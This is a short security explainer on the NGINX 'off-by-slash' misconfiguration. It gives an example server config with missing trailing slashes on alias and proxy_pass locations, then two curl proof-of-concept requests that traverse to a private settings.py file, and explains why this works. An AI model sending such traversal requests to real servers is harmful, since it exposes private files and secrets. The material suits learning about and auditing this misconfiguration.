## Of By Slash

NGINX can be misconfigured and allow path traversal to potential sensitive resources.

File System:
```
/data/              #PRIVATE
/data/settings.py   #PRIVATE
/data/www/          #PUBLIC
/data/www/static/   #PUBLIC
/data/v1/           #PUBLIC
```

Example Config:
```
http {
   server {
        location / {
            root /data/www;
        }

        location /static {
            alias /data/www/static/;
        }

        location /v1 {
            root /data/;
        }


        location /user {
            root /data/v1/;
            index user.html;
        }

        location /api {
            proxy_pass http://127.0.0.1/v1/;
        }
    }
}
```

PoC
```
curl http://127.0.0.1/static../settings.py
curl http://127.0.0.1/api../settings.py
```

Why does this work?

This directory traversal is only possible due to a parsing error of **alias* and **proxy_pass**.

For the request **http://127.0.0.1/api../settings.py** NGINX  checks for /api and then strips it leaving only ../settings.py. The this is added to the proxy_pass URL
**http://127.0.0.1/v1/../settings.py**. This way we end up with **http://127.0.0.1/settings.py**. Since the root is data the file /data/settings.py is retrieved which should not happen.

The same applies for the *alias* parser
First NGINX checks /static exists and the removes it, leaving the ../settings.py --> http://127.0.01/../settings.py --> http://127.0.0.1/settings.py
